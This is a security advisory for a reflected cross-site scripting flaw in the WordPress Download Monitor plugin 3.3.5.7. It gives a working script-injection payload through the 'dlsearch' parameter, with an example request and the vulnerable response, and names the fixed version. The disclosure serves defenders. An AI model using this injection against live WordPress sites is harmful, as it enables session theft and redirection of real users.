| Wordpress Download Monitor - Download Page Cross-Site Scripting |
\-----------------------------------------------------------------/


Summary
=======

Wordpress Download Monitor 3.3.5.7 is subject to a cross-site scripting vulnerability. The 'dlsearch' parameter is not sufficiently 

sanitised before being written to pages including the '[download_page]' shortcode. An attacker could distribute a malicious URL as part 

of a phishing campaign. Users following the link would trigger this vulnerability which could potentially steal session cookies, 

redirect the user to a malicious URL or download malware onto their machine.

Affected Products
======== ========

Confirmed in Wordpress Download Monitor 3.3.5.7. Versions prior to 3.3.5.9 may also be affected.


Details
=======cv
The 'dlsearch' parameter, written to any page/post including the '[download_page]' shortcode, was found to be subject to a cross-site 

scripting vulnerability. It was possible to inject arbitrary Javascript code into the parameter which is passed into the page content 

without sanitisation. 

Injecting the following Javascript code will trigger the vulnerability, causing the page to return a Javascript alert box:

"><script>alert('xsstest')</script>

---
Example Request:
+---------------

GET /wp/?dlsearch="><script>alert('xsstest')</script> HTTP/1.1
Host: 192.168.0.6


---
Example Response:
+----------------

--- SNIP ---
<form id="download-page-search" action="" method="post">
<p><label for="dlsearch">Search Downloads:</label> <input type="text" name="dlsearch" id="dlsearch" value=""><script>alert('xsstest')

</script>" /><input class="search_submit" type="submit" value="Go" /><input type="hidden" name="page_id" value="2" 

/></p></form><h3>Results found for <em>""><script>alert('xsstest')</script>"</em> <small><a 

href="http://192.168.0.6/wp/">&laquo;&nbsp;Downloads</a></small></h3>
--- SNIP ---


Impact
======

An attacker might entice users to follow a malicious URL, causing Javascript code to execute in their browser, potentially stealing 

session cookies, redirecting the user to a malicious URL or downloading malware onto their machine.


Solution
========

Upgrade to Wordpress Download Monitor 3.3.5.9.
